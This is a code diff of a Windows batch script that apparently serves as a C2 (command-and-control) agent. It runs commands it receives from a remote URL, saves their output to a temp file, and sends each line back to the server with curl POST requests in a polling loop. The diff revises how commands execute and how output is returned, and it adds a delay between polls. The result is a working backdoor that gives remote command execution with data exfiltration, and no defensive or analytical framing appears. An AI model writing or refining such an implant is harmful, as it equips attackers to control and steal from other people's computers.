@@ -14,20 +14,19 @@ echo [*] URL: %URL%
     
     echo [*] Executing: %CMD%
     
-    rem Create temp file to capture output (handles special chars better)
+    rem Execute command and send output
     set TEMPFILE=%TEMP%\c2_output.txt
-    %CMD% > "%TEMPFILE%" 2>&1
+    cmd /c "%CMD%" > "%TEMPFILE%" 2>&1
     
-    rem Send output back line by line
-    for /f "usebackq delims=" %%O in ("%TEMPFILE%") do (
-        curl -X POST -d "%%O" %URL% 2>nul
+    rem Send output back
+    if exist "%TEMPFILE%" (
+        for /f "usebackq delims=" %%O in ("%TEMPFILE%") do (
+            curl -X POST -d "%%O" %URL% 2>nul
+        )
+        del "%TEMPFILE%" 2>nul
     )
     
-    rem If file is empty, send empty response
-    if not exist "%TEMPFILE%" (
-        curl -X POST -d "" %URL% 2>nul
-    )
-    
-    del "%TEMPFILE%" 2>nul
+    rem IMPORTANT: Wait for server to process before requesting next command
+    timeout /t 1 /nobreak >nul
     
     goto loop
